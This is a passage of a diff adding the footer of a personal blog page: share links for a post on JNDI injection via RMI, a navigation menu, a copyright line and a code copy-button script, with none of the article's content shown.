+  <li><a class="icon" href="https://getpocket.com/save?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&name=jndi注入学习笔记(rmi向量)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&t=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    tian
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
